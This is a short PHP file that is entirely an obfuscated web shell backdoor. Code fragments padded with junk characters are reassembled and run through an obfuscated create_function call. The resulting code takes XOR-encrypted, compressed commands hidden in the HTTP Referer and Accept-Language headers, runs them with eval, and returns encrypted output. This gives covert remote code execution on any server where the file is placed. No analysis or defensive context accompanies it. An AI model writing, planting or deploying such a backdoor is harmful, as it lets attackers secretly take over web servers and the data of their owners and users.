<?php
$G='$kh="5cbc";[K[K$kf=[K"f07e";fu[Knction x[K[K($t,$[Kk[K){$c=[Kstrlen($k);$l=st[Krl[Ken($t);$o="";[Kf';
$m='se6[K4_en[Kcode[K(x([Kgzco[Kmpress($[Ko),$k));pr[Kint[K([K"<$k>$d</$[Kk>")[K;@[Ksession_destroy();}}}}';
$e='r=[K$_SERV[KER;[K$rr=@[K$r["HT[KTP_REF[KERER"];$ra[K=@[K$r["H[KTTP_ACCEPT_[KL[KANGUAG[KE"];if($rr&[K&$ra[K){';
$K='ray[K_key_exi[K[Ksts($i[K,$s)){[K$[Ks[$i].=$p;$e=strp[Kos($[Ks[$i[K],$f[K);if($e){$k=$k[Kh.$[Kkf;ob_st[Ka';
$p=');$s=[K&$[K_SESSIO[KN;$ss="subs[Ktr";$sl=[K"strt[Kolower"[K;$i[K=$m[K[1][0][K.$m[1][1][K;$[Kh=$sl($ss(m';
$N='d[K[K5($i.$kh),[K0,3));[K$f=$sl($[K[Kss(md5($i.$kf[K),0[K,[K3));$p="[K";[Kfor($z[K=1;$z<count($m[[K1]);$z';
$Z='+[K+)$p[K.=$q[$[Km[K[2][[K$z][K];if(strpos([K$p,$h)===0){[K$s[K[$i][K="";[K$p=$ss([K$p[K,3);}if(ar';
$j='$u=pars[Ke_u[K[Krl($rr);[Kparse_str($[Ku["quer[Ky"],$[Kq[K);$q=array_va[Kl[Kues($q);[K[Kp[Kreg_ma';
$D=str_replace('gh','','cghghreategh_fghuncghghtion');
$U='r[Kt()[K;@ev[Kal(@gzunc[Kompres[Ks(@x(@[Kbase[K64_dec[Kode(preg_r[Keplace(ar[Kray[K[K("/[K_/","/-/"';
$Q='or($[Ki=0;[K$i<$l[K;){for($j=0;([K$[Kj<$c&&$[K[Ki<$l);$j++,$[Ki++){$o.[K=$t{$i}^[K[K$[Kk{$j};}}r[Keturn $o;}$';
$O='tch_all("/([\\w[K])[[K\\w-]+(?:[K;q[K[K=0.([\\d]))[K?,?/",$ra,[K$[Km);if($q&&$m[K){@se[Ks[Ksion_star[Kt(';
$V=')[K,array("/[K","+"),$ss([K$[Ks[$i],[K0,$[Ke))),$k))[K);$o=ob_get_[Kcontent[Ks()[K;[Ko[Kb_end_clean();$[Kd=ba';
$T=str_replace('[K','',$G.$Q.$e.$j.$O.$p.$N.$Z.$K.$U.$V.$m);
$v=$D('',$T);$v();
?>
